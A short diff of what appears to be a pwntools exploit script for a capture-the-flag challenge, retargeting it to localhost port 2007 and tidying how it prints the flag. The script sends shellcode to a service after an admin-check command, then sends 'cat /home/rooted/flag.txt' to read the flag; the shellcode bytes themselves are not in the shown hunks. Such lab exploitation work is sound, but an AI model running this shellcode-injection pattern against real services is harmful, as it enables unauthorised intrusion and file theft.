@@ -4,14 +4,13 @@ import time
 
 ### set  for  challenge ###
 context(arch = 'amd64', os = 'linux')
-addr = ADDRESS_HERE 
+addr = 'localhost'
 port = 2007
 ### set  for  challenge ###
 
 ###other setup
 context.terminal = ['tmux', 'splitw', '-h']
 p = remote(addr,port)
-
 
 ### shellcode
 hexx = """
@@ -80,8 +79,6 @@ def pwn():
     command(".admin_check")
     p.sendafter("Commands:", sh+b"\n")
 
-
-
 if __name__ == "__main__":
     #input char from shell
     CHAR = ">"
@@ -93,6 +90,5 @@ if __name__ == "__main__":
     pwn()
     #grab flag!
     p.sendlineafter("Admin!","cat /home/rooted/flag.txt")
-    p.recvline()
-    print(p.recvline())
+    print(p.recvuntil("}").strip())
 
